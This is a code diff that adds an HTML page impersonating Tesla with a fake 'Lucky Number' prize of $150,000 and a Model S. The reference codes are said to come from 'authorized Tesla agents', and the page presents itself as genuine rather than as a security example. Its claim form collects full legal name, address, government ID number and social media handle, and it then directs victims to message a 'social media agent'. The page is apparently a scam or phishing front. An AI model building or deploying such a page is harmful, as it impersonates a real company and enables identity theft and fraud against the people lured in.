@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tesla — Lucky Number</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<!-- ── NAV ─────────────────────────────────────────────────── -->
+<nav id="navbar" class="scrolled">
+  <a class="nav-logo" href="index.html">TESL<span>A</span></a>
+  <div class="nav-links">
+    <a href="shop.html">Vehicles</a>
+    <a href="prize.html" style="color:var(--gold)">Lucky Number</a>
+  </div>
+  <div class="nav-right">
+    <a href="login.html" id="nav-login">Sign In</a>
+    <a href="dashboard.html" id="nav-dash" style="display:none">Dashboard</a>
+    <button class="btn btn-outline" id="nav-logout" style="display:none;padding:.4rem 1rem;font-size:.75rem;">Sign Out</button>
+  </div>
+</nav>
+
+<!-- ── LOADER SCREEN ─────────────────────────────────────────── -->
+<div id="loader-screen" class="hidden">
+  <div class="loader-ring"></div>
+  <div style="text-align:center;">
+    <div class="loader-text">Verifying Reference Code…</div>
+    <div style="font-size:.75rem;color:var(--gray-600);margin-top:.5rem;letter-spacing:.08em;">Please do not close this window</div>
+  </div>
+</div>
+
+<!-- ── LUCKY NUMBER ENTRY ────────────────────────────────────── -->
+<div id="lucky-screen" style="min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem;
+  background-image:url('https://images.unsplash.com/photo-1617788138017-80ad40651399?w=1400&q=50');
+  background-size:cover;background-position:center;">
+  <div style="position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);"></div>
+
+  <div style="position:relative;z-index:2;width:100%;max-width:520px;">
+    <div style="text-align:center;margin-bottom:2.5rem;">
+      <div style="font-size:3rem;margin-bottom:.75rem;">🏆</div>
+      <div style="display:inline-block;padding:.3rem .9rem;border:1px solid var(--gold);border-radius:99px;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;color:var(--gold);margin-bottom:1rem;">Exclusive Promotion</div>
+      <h1 class="section-title" style="color:var(--gold);">Lucky Number</h1>
+      <p class="section-sub" style="margin-top:.75rem;">Enter your exclusive reference code below.<br/>One winner receives $150,000 & a Black Tesla Model S.</p>
+    </div>
+
+    <div class="form-card" style="background:rgba(10,10,10,.9);">
+      <form id="lucky-form" novalidate>
+        <div class="form-group">
+          <label class="form-label" for="lucky-input">Reference Code</label>
+          <input class="form-input" id="lucky-input" type="text" placeholder="e.g. SPE-XXXXXXXXXX"
+            style="text-align:center;letter-spacing:.15em;font-size:1.05rem;font-weight:600;text-transform:uppercase;"/>
+          <p class="form-error" id="err-lucky"></p>
+        </div>
+        <button type="submit" class="btn btn-gold w-full mt-2" style="padding:.85rem;font-size:.9rem;">Verify Code</button>
+      </form>
+      <p style="font-size:.72rem;color:var(--gray-600);text-align:center;margin-top:1rem;">Reference codes are provided by authorized Tesla agents only.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ── WINNER SCREEN ─────────────────────────────────────────── -->
+<div id="winner-screen" class="hidden" style="min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem;
+  background:radial-gradient(ellipse at center, #1a1200 0%, #0a0a0a 70%);">
+  <div style="width:100%;max-width:700px;">
+
+    <div class="winner-card">
+      <div class="winner-trophy">🏆</div>
+      <div class="winner-title">Congratulations!</div>
+      <div style="font-size:.85rem;color:var(--gray-400);letter-spacing:.1em;text-transform:uppercase;margin:.5rem 0 1rem;">You Have Won</div>
+      <div class="winner-amount">$150,000</div>
+      <div style="font-size:1.1rem;font-weight:600;letter-spacing:.06em;margin:.25rem 0 2rem;">+ a Black Tesla Model S</div>
+      <p style="font-size:.85rem;color:var(--gray-400);margin-bottom:2rem;line-height:1.7;">
+        Your code has been verified. Please complete the prize claim form below to receive your winnings and arrange delivery of your Tesla Model S.
+      </p>
+      <button class="btn btn-gold" style="padding:.9rem 2.5rem;"
+        onclick="document.getElementById('prize-section').scrollIntoView({behavior:'smooth'})">
+        Claim Your Prize →
+      </button>
+    </div>
+
+    <!-- ── PRIZE CLAIM FORM ──────────────────────────────────── -->
+    <div id="prize-section" style="margin-top:3rem;">
+      <div id="prize-form-wrap" class="form-card" style="max-width:100%;">
+        <div class="form-title" style="color:var(--gold);">Prize Claim Form</div>
+        <p style="font-size:.8rem;color:var(--gray-400);text-align:center;margin-bottom:1.5rem;">
+          Please fill in your details accurately. This information will be used for prize disbursement.
+        </p>
+        <form id="prize-form" novalidate>
+          <div class="form-group">
+            <label class="form-label">Full Legal Name</label>
+            <input class="form-input" id="prize-name" type="text" placeholder="As on your ID"/>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Delivery Address</label>
+            <input class="form-input" id="prize-address" type="text" placeholder="Full address including city & country"/>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Government ID Number</label>
+            <input class="form-input" id="prize-id" type="text" placeholder="Passport / National ID"/>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Social Media Handle</label>
+            <input class="form-input" id="prize-social" type="text" placeholder="@yourhandle"/>
+          </div>
+          <button type="submit" class="btn btn-gold w-full mt-4" style="padding:.85rem;">Submit Prize Claim</button>
+        </form>
+        <p style="font-size:.72rem;color:var(--gray-600);text-align:center;margin-top:1rem;">
+          You must be signed in to submit. <a href="login.html" style="color:var(--gray-400);text-decoration:underline;">Sign in here.</a>
+        </p>
+      </div>
+
+      <!-- SUCCESS STATE -->
+      <div id="prize-success" class="hidden winner-card" style="margin-top:0;">
+        <div style="font-size:3rem;margin-bottom:1rem;">🎉</div>
+        <div class="winner-title">Claim Submitted!</div>
+        <p style="font-size:.9rem;color:var(--gray-400);margin:1rem 0;">Your unique Order Code is:</p>
+        <div id="prize-order-code" style="
+          font-family:'Rajdhani',sans-serif;font-size:1.8rem;font-weight:700;
+          letter-spacing:.2em;color:var(--gold);
+          background:rgba(201,168,76,.08);border:1px solid var(--gold);
+          border-radius:8px;padding:.75rem 1.5rem;margin:1rem auto;display:inline-block;">
+        </div>
+        <p style="font-size:.85rem;color:var(--gray-400);margin-top:1rem;line-height:1.7;">
+          📸 <strong style="color:var(--white);">Take a screenshot of this code.</strong><br/>
+          Send it to your social media agent to proceed with prize fulfillment. Our team will contact you within 24–48 hours.
+        </p>
+        <a href="dashboard.html" class="btn btn-gold mt-6" style="padding:.85rem 2rem;">View My Dashboard →</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <p>© 2025 Tesla, Inc. All rights reserved.</p>
+  </div>
+</footer>
+
+<script type="module">
+  import { initNav, initLucky, initPrizeForm } from './main.js';
+  initNav();
+  initLucky();
+  initPrizeForm();
+</script>
+</body>
+</html>
